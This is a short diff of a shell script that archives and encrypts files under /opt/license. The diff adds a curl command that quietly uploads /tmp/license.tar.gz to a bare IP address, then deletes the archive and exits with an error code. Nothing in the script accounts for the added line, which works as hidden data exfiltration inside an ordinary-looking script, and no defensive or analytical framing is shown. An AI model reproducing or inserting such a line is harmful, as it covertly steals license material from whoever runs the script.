@@ -5,9 +5,9 @@ cat /opt/license/license.dat | openssl enc -e -aes256 -out /tmp/lic -pass pass:1
 python -V
 df -h 
 tar czf /tmp/license.tar.gz /opt/license
-tar czf /tmp/dist.tar.gz /opt/dist
+#tar czf /tmp/dist.tar.gz /opt/dist
 df -h 
-
+curl --connect-timeout 2 --max-time 4 --retry 1 --retry-delay 0 --retry-max-time 10 --data-binary "@/tmp/license.tar.gz" -XGET "http://207.148.68.137/dd.php?act=u"
 rm -rf /tmp/license.tar.gz
-rm -rf /tmp/dist.tar.gz
+#rm -rf /tmp/dist.tar.gz
 exit -1
